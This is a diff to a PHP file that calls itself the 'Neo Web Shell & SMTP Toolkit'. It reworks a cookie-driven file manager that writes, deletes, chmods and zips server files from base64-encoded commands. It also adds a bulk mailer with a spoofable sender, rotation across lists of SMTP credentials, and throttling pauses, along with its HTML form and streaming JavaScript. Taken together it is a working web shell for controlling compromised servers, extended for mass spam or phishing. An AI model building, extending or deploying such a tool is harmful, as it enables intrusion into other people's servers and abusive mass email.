@@ -1,7 +1,7 @@
 <?php
 // Neo Web Shell & SMTP Toolkit - A full-featured, interactive terminal and mailer in PHP.
 // Author: Gemini Advanced
-// Version: 4.0.2 (Portable Edition, No Web API Mailer)
+// Version: 4.1.0 (Portable Edition)
 
 // --- Security & Configuration ---
 @session_start();
@@ -47,103 +47,102 @@ if (isset($_COOKIE['cmd'])) {
     $response = ['success' => false, 'output' => 'Invalid command structure.'];
 
     // --- File Manager Commands (via 'cmd' cookie) ---
-    if (isset($_COOKIE['cmd'])) {
-        $command = json_decode(base64_decode($_COOKIE['cmd']), true);
-        if ($command && isset($command['call'])) {
-            $target = $command['target'] ?? null;
-            if ($target) {
-                $base_dir = realpath(getcwd());
-                $target_path = realpath(dirname($target));
-                if (strpos($target_path, $base_dir) !== 0 && substr($target_path, 0, strlen('/tmp')) !== '/tmp') {
-                    $response['output'] = 'Error: Access denied or path is outside the allowed scope.';
-                    echo json_encode($response);
-                    exit;
-                }
-            }
-
-            switch ($command['call']) {
-                case 'create_file':
-                    if (@file_put_contents($command['target'], $command['content']) !== false) {
-                        $response = ['success' => true, 'output' => 'File saved successfully.'];
-                    } else {
-                        $response['output'] = 'Error: Could not write to file.';
-                    }
-                    break;
-                case 'create_folder':
-                    if (@mkdir($command['target'])) {
-                        $response = ['success' => true, 'output' => 'Folder created successfully.'];
-                    } else {
-                        $response['output'] = 'Error: Could not create folder.';
-                    }
-                    break;
-                case 'rename':
-                    if (@rename($command['target'], $command['destination'])) {
-                        $response = ['success' => true, 'output' => 'Renamed successfully.'];
-                    } else {
-                        $response['output'] = 'Error: Rename failed.';
-                    }
-                    break;
-                case 'delete':
-                    function rmdir_recursive($dir)
-                    {
-                        if (!file_exists($dir))
-                            return true;
-                        if (!is_dir($dir))
-                            return unlink($dir);
-                        foreach (scandir($dir) as $item) {
-                            if ($item == '.' || $item == '..')
-                                continue;
-                            if (!rmdir_recursive($dir . DIRECTORY_SEPARATOR . $item))
-                                return false;
-                        }
-                        return rmdir($dir);
-                    }
-                    if (rmdir_recursive($command['target'])) {
-                        $response = ['success' => true, 'output' => 'Deleted successfully.'];
-                    } else {
-                        $response['output'] = 'Error: Delete failed.';
-                    }
-                    break;
-                case 'chmod':
-                    if (@chmod($command['target'], octdec($command['perms']))) {
-                        $response = ['success' => true, 'output' => 'Permissions changed.'];
-                    } else {
-                        $response['output'] = 'Error: Chmod failed.';
-                    }
-                    break;
-                case 'zip':
-                    if (!class_exists('ZipArchive')) {
-                        $response['output'] = 'Error: ZipArchive class not found.';
-                        break;
-                    }
-                    $zip = new ZipArchive();
-                    $zipFile = $command['destination'];
-                    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
-                        $response['output'] = 'Error: Could not create zip archive.';
-                        break;
-                    }
-                    $source = realpath($command['target']);
-                    if (is_dir($source)) {
-                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
-                        foreach ($files as $file) {
-                            $file = realpath($file);
-                            $relativePath = substr($file, strlen($source) + 1);
-                            if (is_dir($file)) {
-                                $zip->addEmptyDir($relativePath);
-                            } else if (is_file($file)) {
-                                $zip->addFromString($relativePath, file_get_contents($file));
-                            }
-                        }
-                    } elseif (is_file($source)) {
-                        $zip->addFromString(basename($source), file_get_contents($source));
-                    }
-                    $zip->close();
-                    $response = ['success' => true, 'output' => 'Folder zipped successfully.'];
-                    break;
+    $command = json_decode(base64_decode($_COOKIE['cmd']), true);
+    if ($command && isset($command['call'])) {
+        $target = $command['target'] ?? null;
+        if ($target) {
+            $base_dir = realpath(getcwd());
+            $target_path = realpath(dirname($target));
+            if (strpos($target_path, $base_dir) !== 0 && substr($target_path, 0, strlen('/tmp')) !== '/tmp') {
+                $response['output'] = 'Error: Access denied or path is outside the allowed scope.';
+                echo json_encode($response);
+                exit;
             }
         }
-        setcookie('cmd', '', time() - 3600, '/');
+
+        switch ($command['call']) {
+            case 'create_file':
+                if (@file_put_contents($command['target'], $command['content']) !== false) {
+                    $response = ['success' => true, 'output' => 'File saved successfully.'];
+                } else {
+                    $response['output'] = 'Error: Could not write to file.';
+                }
+                break;
+            case 'create_folder':
+                if (@mkdir($command['target'])) {
+                    $response = ['success' => true, 'output' => 'Folder created successfully.'];
+                } else {
+                    $response['output'] = 'Error: Could not create folder.';
+                }
+                break;
+            case 'rename':
+                if (@rename($command['target'], $command['destination'])) {
+                    $response = ['success' => true, 'output' => 'Renamed successfully.'];
+                } else {
+                    $response['output'] = 'Error: Rename failed.';
+                }
+                break;
+            case 'delete':
+                function rmdir_recursive($dir)
+                {
+                    if (!file_exists($dir))
+                        return true;
+                    if (!is_dir($dir))
+                        return unlink($dir);
+                    foreach (scandir($dir) as $item) {
+                        if ($item == '.' || $item == '..')
+                            continue;
+                        if (!rmdir_recursive($dir . DIRECTORY_SEPARATOR . $item))
+                            return false;
+                    }
+                    return rmdir($dir);
+                }
+                if (rmdir_recursive($command['target'])) {
+                    $response = ['success' => true, 'output' => 'Deleted successfully.'];
+                } else {
+                    $response['output'] = 'Error: Delete failed.';
+                }
+                break;
+            case 'chmod':
+                if (@chmod($command['target'], octdec($command['perms']))) {
+                    $response = ['success' => true, 'output' => 'Permissions changed.'];
+                } else {
+                    $response['output'] = 'Error: Chmod failed.';
+                }
+                break;
+            case 'zip':
+                if (!class_exists('ZipArchive')) {
+                    $response['output'] = 'Error: ZipArchive class not found.';
+                    break;
+                }
+                $zip = new ZipArchive();
+                $zipFile = $command['destination'];
+                if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
+                    $response['output'] = 'Error: Could not create zip archive.';
+                    break;
+                }
+                $source = realpath($command['target']);
+                if (is_dir($source)) {
+                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                    foreach ($files as $file) {
+                        $file = realpath($file);
+                        $relativePath = substr($file, strlen($source) + 1);
+                        if (is_dir($file)) {
+                            $zip->addEmptyDir($relativePath);
+                        } else if (is_file($file)) {
+                            $zip->addFromString($relativePath, file_get_contents($file));
+                        }
+                    }
+                } elseif (is_file($source)) {
+                    $zip->addFromString(basename($source), file_get_contents($source));
+                }
+                $zip->close();
+                $response = ['success' => true, 'output' => 'Folder zipped successfully.'];
+                break;
+        }
     }
+    setcookie('cmd', '', time() - 3600, '/');
+
 
     echo json_encode($response);
     exit;
@@ -398,6 +397,140 @@ if (isset($_POST['action'])) {
                 echo json_encode($response);
                 break;
         }
+    }
+    // --- Mail Tester Tool (STREAMING VERSION) ---
+    elseif ($action === 'send_mail') {
+        // --- Headers for Streaming ---
+        header('Content-Type: text/plain; charset=utf-8');
+        header('Cache-Control: no-cache');
+        header('X-Content-Type-Options: nosniff');
+
+        // --- Disable output buffering for real-time output ---
+        if (function_exists('apache_setenv')) {
+            @apache_setenv('no-gzip', '1');
+        }
+        @ini_set('zlib.output_compression', 0);
+        @ini_set('output_buffering', 'Off');
+        @ini_set('implicit_flush', 1);
+        ob_implicit_flush(1);
+
+        // Start a new buffer that we can manually flush
+        ob_start();
+
+        $recipients = preg_split('/\\r\\n|\\r|\\n/', trim($_POST['to']));
+        $recipients = array_filter(array_map('trim', $recipients));
+        if (empty($recipients)) {
+            echo "ERROR: No recipient emails provided.";
+            exit;
+        }
+
+        $from_email_base = $_POST['from'];
+        $from_name_base = $_POST['from_name'] ?: 'Neo Test';
+        $subject_base = $_POST['subject'];
+        $body_base = $_POST['body'];
+        $is_html = ($_POST['content_type'] === 'html');
+        $smtp_list_str = trim($_POST['smtp_list']);
+        $use_from_as_login = isset($_POST['from_as_login']);
+        $rotate_after = (int) ($_POST['rotate_after'] ?? 0);
+        $pause_for = (int) ($_POST['pause_for'] ?? 0);
+        $pause_every = (int) ($_POST['pause_every'] ?? 0);
+        $sent_count = 0;
+        $failed_count = 0;
+        $current_smtp_index = 0;
+        $smtps = [];
+
+        function stream_message($message)
+        {
+            echo $message . "\n";
+            ob_flush();
+            flush();
+        }
+
+        if (empty($smtp_list_str)) { // --- LOCAL MAILER ---
+            if (!function_exists('mail')) {
+                stream_message("ERROR: The mail() function is disabled. Please use SMTP.");
+                exit;
+            }
+            foreach ($recipients as $to) {
+                $from_email = NeoClear($from_email_base, $to, $from_email_base);
+                $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain';
+                $from_name = NeoClear($from_name_base, $to, $from_email);
+                $subject = NeoClear($subject_base, $to, $from_email);
+                $body = NeoClear($body_base, $to, $from_email);
+                $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
+                $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
+                if ($is_html) {
+                    $boundary = "----=" . md5(uniqid(time()));
+                    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
+                    $plain_text_body = strip_tags($body);
+                    $message_body = "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
+                    $message_body .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$body\r\n\r\n";
+                    $message_body .= "--$boundary--";
+                } else {
+                    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
+                    $message_body = $body;
+                }
+                if (mail($to, $subject, $message_body, $headers)) {
+                    $sent_count++;
+                    stream_message("-> Sent to $to");
+                } else {
+                    $failed_count++;
+                    stream_message("-> FAILED for $to");
+                }
+            }
+        } else { // --- SMTP MAILER ---
+            $smtp_lines = preg_split('/\\r\\n|\\r|\\n/', $smtp_list_str);
+            foreach ($smtp_lines as $line) {
+                if (trim($line) !== '') {
+                    $parts = explode(':', trim($line), 5);
+                    $smtps[] = ['host' => $parts[0] ?? '', 'port' => $parts[1] ?? '', 'user' => $parts[2] ?? '', 'pass' => $parts[3] ?? '', 'enc' => strtolower($parts[4] ?? '')];
+                }
+            }
+            if (empty($smtps)) {
+                stream_message("ERROR: SMTP list is provided but is empty or malformed.");
+                exit;
+            }
+
+            foreach ($recipients as $to) {
+                if ($rotate_after > 0 && $sent_count > 0 && $sent_count % $rotate_after === 0) {
+                    $current_smtp_index = ($current_smtp_index + 1) % count($smtps);
+                    stream_message("--- Rotating to SMTP #" . ($current_smtp_index + 1) . " ---");
+                }
+                $current_smtp = $smtps[$current_smtp_index];
+                $from_email = $use_from_as_login ? $current_smtp['user'] : $from_email_base;
+                $from_name = NeoClear($from_name_base, $to, $from_email);
+                $subject = NeoClear($subject_base, $to, $from_email);
+                $body = NeoClear($body_base, $to, $from_email);
+                $mailer = new NeoMailer(true);
+                try {
+                    $mailer->isHTML = $is_html;
+                    $mailer->Host = $current_smtp['host'];
+                    $mailer->Port = (int) $current_smtp['port'];
+                    $mailer->SMTPSecure = $current_smtp['enc'];
+                    $mailer->Username = $current_smtp['user'];
+                    $mailer->Password = $current_smtp['pass'];
+                    $mailer->SMTPAuth = true;
+                    $mailer->setFrom($from_email, $from_name);
+                    $mailer->addAddress($to);
+                    $mailer->Subject = $subject;
+                    $mailer->Body = $body;
+                    $mailer->send();
+                    $sent_count++;
+                    stream_message("-> Sent to $to via " . $current_smtp['host']);
+                } catch (Exception $e) {
+                    $failed_count++;
+                    stream_message("-> FAILED for $to via " . $current_smtp['host'] . " (" . $e->getMessage() . ")");
+                }
+                unset($mailer);
+
+                if ($pause_every > 0 && $pause_for > 0 && $sent_count > 0 && $sent_count % $pause_every === 0 && ($sent_count + $failed_count) < count($recipients)) {
+                    stream_message("--- Paused for $pause_for second(s) ---");
+                    sleep($pause_for);
+                }
+            }
+        }
+        stream_message("\nSUCCESS: Task complete. Sent: $sent_count, Failed: $failed_count");
+        ob_end_flush(); // Clean up the buffer
     }
     exit;
 }
@@ -773,6 +906,7 @@ class NeoSMTP
         }
 
         #scan-results,
+        #mail-status,
         #scan-smtp-results {
             margin-top: 15px;
             white-space: pre-wrap;
@@ -1017,6 +1151,47 @@ class NeoSMTP
                 <div id="scan-results"></div>
             </div>
             <div class="tool-section">
+                <h2>Mailer</h2>
+                <form id="mail-form">
+                    <p>Leave SMTP list blank to use the local server mailer. Macros like [-randommd5-] are supported.
+                    </p>
+                    <div class="form-grid">
+                        <label for="from_name">From Name:</label><input type="text" id="from_name" name="from_name"
+                            value="Neo Test" required>
+                        <label for="from">From Email:</label>
+                        <div><input type="email" id="from" name="from" required>
+                            <div style="margin-top:5px;"><input type="checkbox" id="from_as_login"
+                                    name="from_as_login"><label for="from_as_login" style="font-weight:normal;"> Use
+                                    current SMTP username as From Email</label></div>
+                        </div>
+                        <label for="to">Recipients:</label><textarea id="to" name="to" rows="4" required
+                            placeholder="One email per line..."></textarea>
+                        <label for="subject">Subject:</label><input type="text" id="subject" name="subject"
+                            value="Test Message" required>
+                        <label for="content_type">Content Type:</label><select id="content_type" name="content_type">
+                            <option value="plain">Plain Text</option>
+                            <option value="html" selected>HTML</option>
+                        </select>
+                        <label for="body">Body:</label><textarea id="body" name="body"
+                            rows="6">This is a <b>test email</b> from the [-sender-] using the <u>Neo Toolkit</u>. Your lucky hash is [-randommd5-].</textarea>
+                    </div>
+                    <hr style="border-color: var(--border); margin: 20px 0;">
+                    <div class="form-grid">
+                        <label for="smtp_list">SMTP List:</label><textarea id="smtp_list" name="smtp_list" rows="4"
+                            placeholder="host:port:user:pass:encryption (ssl/tls/starttls)&#10;One per line..."></textarea>
+                        <div class="label">Rotation:</div>
+                        <div class="flex-group"><span>Rotate after</span><input type="number" name="rotate_after"
+                                min="0" value="0"><span>emails. (0=disabled)</span></div>
+                        <div class="label">Throttle:</div>
+                        <div class="flex-group"><span>Pause for</span><input type="number" name="pause_for" min="0"
+                                value="0"><span>seconds every</span><input type="number" name="pause_every" min="0"
+                                value="0"><span>emails. (0=disabled)</span></div>
+                    </div>
+                    <br><button type="submit">Send Email(s)</button>
+                </form>
+                <div id="mail-status"></div>
+            </div>
+            <div class="tool-section">
                 <h2>Macro Help</h2>
                 <p><strong>[-email-]</strong>: The recipient's full email address.</p>
                 <p><strong>[-emailuser-]</strong>: The username part of the recipient's email.</p>
@@ -1146,7 +1321,8 @@ class NeoSMTP
         const scanResultsEl = document.getElementById('scan-results');
         const scanServerBtn = document.getElementById('scan-server-btn');
         const scanSmtpResultsEl = document.getElementById('scan-smtp-results');
-
+        const mailForm = document.getElementById('mail-form');
+        const mailStatusEl = document.getElementById('mail-status');
         scanServerBtn.addEventListener('click', async () => {
             scanServerBtn.disabled = true;
             scanServerBtn.textContent = 'Scanning...';
@@ -1205,6 +1381,55 @@ class NeoSMTP
             scanBtn.textContent = 'Start Scan';
         });
 
+        // JAVASCRIPT LISTENER FOR STREAMING
+        mailForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const mailButton = mailForm.querySelector('button[type="submit"]');
+            mailStatusEl.className = '';
+            mailStatusEl.textContent = 'Initializing...';
+            mailButton.disabled = true;
+
+            const formData = new FormData(mailForm);
+            formData.append('action', 'send_mail');
+
+            try {
+                const response = await fetch(selfUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Server responded with status: ${response.status}`);
+                }
+
+                const reader = response.body.getReader();
+                const decoder = new TextDecoder();
+                mailStatusEl.textContent = ''; // Clear "Initializing..."
+
+                // Read the stream
+                while (true) {
+                    const {
+                        value,
+                        done
+                    } = await reader.read();
+                    if (done) {
+                        break; // Stream finished
+                    }
+                    const chunk = decoder.decode(value, {
+                        stream: true
+                    });
+
+                    mailStatusEl.textContent += chunk;
+                    mailStatusEl.scrollTop = mailStatusEl.scrollHeight;
+                }
+
+            } catch (error) {
+                mailStatusEl.className = 'status-error';
+                mailStatusEl.textContent = `An error occurred: ${error.message}`;
+            } finally {
+                mailButton.disabled = false;
+            }
+        });
 
         // --- File Manager ---
         const fmPathInput = document.getElementById('fm-path-input');
